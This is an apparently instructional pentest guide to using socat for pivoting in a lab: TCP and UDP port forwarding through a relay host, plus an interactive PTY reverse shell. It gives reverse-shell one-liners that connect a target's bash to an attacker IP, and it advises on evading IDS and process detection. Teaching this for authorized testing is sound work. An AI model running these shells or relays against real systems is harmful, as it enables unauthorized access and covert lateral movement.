Socat is a multipurpose bidirectional stream relay. It connects two endpoints — each described by a type and options — and relays data between them. In pivoting engagements, socat is used primarily as a raw TCP or UDP port forwarder or as a mechanism to create an interactive TTY reverse shell. Its most operationally significant property is that it is often already installed on Linux targets, meaning no binary transfer is required and no suspicious network download is necessary to begin using it.

Socat is not a tunnel in the way that Chisel or Ligolo-ng are. It does not encrypt data, does not support SOCKS proxies, and has no concept of sessions. It is a dumb relay, and that simplicity is its strength. When you need to redirect traffic from one host:port to another without overhead, socat does it in a single command.

### Why Socat?

In situations where you have RCE or a shell on a Linux box that sits between network segments, socat provides immediate port forwarding without needing to upload any additional tools. The binary is part of the default package repositories on Debian, Red Hat, and Arch-based distributions. A single command starts a forking TCP listener that handles any number of concurrent connections. When operating on restricted targets where file transfer is difficult, socat is often your fastest path to a pivot.

### TL;DR

**TCP port forward (on relay host)**
```bash
socat TCP-LISTEN:8080,fork TCP:10.10.30.200:80
```

**TTY reverse shell (attacker listener)**
```bash
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

**TTY reverse shell (target)**
```bash
socat exec:'bash -li',pty,stderr,sane TCP:192.168.1.10:4444
```

### Download and Installation

On most Linux systems, socat is available through the package manager:

```bash
# Debian / Ubuntu / Kali
apt install socat

# Red Hat / CentOS
yum install socat

# Arch
pacman -S socat
```

If the target has no package manager access, static binaries are available at https://github.com/andrew-d/static-binaries/tree/master/binaries/linux

Transfer the static binary to the target, mark it executable, and run it:

```bash
chmod +x socat
./socat ...
```

> [!NOTE]
> Always check if socat is already installed before attempting a transfer: `which socat` or `command -v socat`. On Kali and many pentest targets, it is present by default.

### Lab Topology

| Host                | Primary IP    | Secondary IP  | Open Ports    | Role           |
| ------------------- | ------------- | ------------- | ------------- | -------------- |
| Attacker (Kali)     | 192.168.1.10  | N/A           | N/A           | Attack Box     |
| Relay Host (Linux)  | 192.168.1.13  | 10.10.30.201  | Socat relay   | Jump Host      |
| Internal Target     | 10.10.30.200  | N/A           | 80, 443, 22   | Internal Host  |

### Mode 1: TCP Port Forwarding

This is the most common socat use case. The relay host listens on a specified port and forwards all received connections to a fixed destination.

#### Run on the Relay Host

```bash
socat TCP-LISTEN:8080,fork TCP:10.10.30.200:80
```

`TCP-LISTEN:8080` opens a listening socket on port 8080. `fork` spawns a new child process for each incoming connection so the relay handles multiple clients concurrently — without `fork`, socat exits after the first connection. `TCP:10.10.30.200:80` is the destination that each accepted connection is forwarded to.

#### Access from the Attacker

```bash
curl http://192.168.1.13:8080
```

All traffic arrives at the relay on port 8080 and is forwarded to the internal host on port 80.

> [!NOTE]
> The relay forwards raw TCP. The destination service sees a connection from the relay host's IP (10.10.30.201), not from the attacker. This is useful for bypassing IP-based access controls if the internal host trusts the relay.

#### Keep the Process Running

To run socat in the background:

```bash
socat TCP-LISTEN:8080,fork TCP:10.10.30.200:80 &
```

To terminate it: `pkill socat` or `kill %1` if it is the only background job.

### Mode 2: UDP Port Forwarding

UDP relaying works identically to TCP with the stream types changed. Some internal services (DNS, SNMP, TFTP) use UDP exclusively.

#### Run on the Relay Host

```bash
socat UDP-LISTEN:53,fork UDP:10.10.30.200:53
```

> [!NOTE]
> UDP is connectionless, so the `fork` flag behaves differently than with TCP. Each datagram spawns a new socat process. For high-volume UDP services this can create many processes. For low-volume protocols like DNS, it works well.

### Mode 3: Interactive TTY Reverse Shell

This mode delivers a fully interactive PTY shell from the target back to the attacker. Unlike a basic bash reverse shell, the PTY allocation means job control (`Ctrl+C`, `Ctrl+Z`), tab completion, and terminal size handling all work correctly — essential for tools like vi, ssh, and sudo that require a real terminal.

#### Set Up the Listener on the Attacker

```bash
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

`file:\`tty\`,raw,echo=0` connects the listener directly to the attacker's own terminal in raw mode, suppressing the local echo. When the target connects, the attacker's terminal becomes the remote shell.

#### Run on the Target

```bash
socat exec:'bash -li',pty,stderr,sane TCP:192.168.1.10:4444
```

`exec:'bash -li'` runs an interactive login bash shell. `pty` allocates a pseudo-terminal for the shell. `stderr` merges stderr into stdout so error messages appear. `sane` applies sensible terminal settings.

The result is a fully usable interactive shell with job control and proper terminal dimensions.

> [!TIP]
> If `bash` is not available, substitute `sh -i` or specify the full path: `exec:'/bin/bash -li'`

### Operational Security Notes

Socat creates a plaintext relay. All forwarded traffic is unencrypted on the network unless the underlying protocol is already encrypted (e.g., forwarding HTTPS). In monitored environments, raw TCP streams carrying HTTP or plaintext credentials will be captured by IDS sensors.

The listening port opened by socat is visible in `netstat -tlnp` output on the relay host. On long-running engagements, consider launching socat from within a session or C2 implant rather than leaving a persistent listener.

Socat processes are visible in `ps aux` output with the full command line, which exposes the IP and port of the destination being targeted. On Windows, socat is rarely available natively, so use Chisel or netsh for Windows relay scenarios.

### Troubleshooting

Relay works but connection drops after one request: You are missing the `fork` option on TCP-LISTEN. Without `fork`, socat handles one connection then exits.

Cannot bind to port below 1024: Low ports require root on most Linux systems. Use a port above 1024 or run socat with sudo.

Shell works but terminal is broken: If arrows, tab completion, or Ctrl+C behave incorrectly, verify that you included `pty,stderr,sane` on the target command and `raw,echo=0` on the attacker listener.

Connection refused on relay: The socat listener may not be running, or the port is filtered by the relay host's firewall. Check with `iptables -L -n` or `ss -tlnp`.

### Quick Reference

| Mode           | Command (Relay / Target Host)                                      |
| -------------- | ------------------------------------------------------------------ |
| TCP forward    | `socat TCP-LISTEN:PORT,fork TCP:DEST_IP:DEST_PORT`                 |
| UDP forward    | `socat UDP-LISTEN:PORT,fork UDP:DEST_IP:DEST_PORT`                 |
| TTY listener   | `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:PORT`                    |
| TTY connect    | `socat exec:'bash -li',pty,stderr,sane TCP:ATTACKER_IP:PORT`       |

### When to Use Socat vs Alternatives

Use socat when: the target is Linux and socat is already installed, you need a single-command relay without uploading extra tooling, or you need a proper TTY shell for interactive work.

Use Chisel or SSH when: you need encryption, multi-hop pivoting, or the relay needs to support multiple independent tunnels.

Use netsh when: the relay host is Windows and you need native port forwarding without transferring any binary.
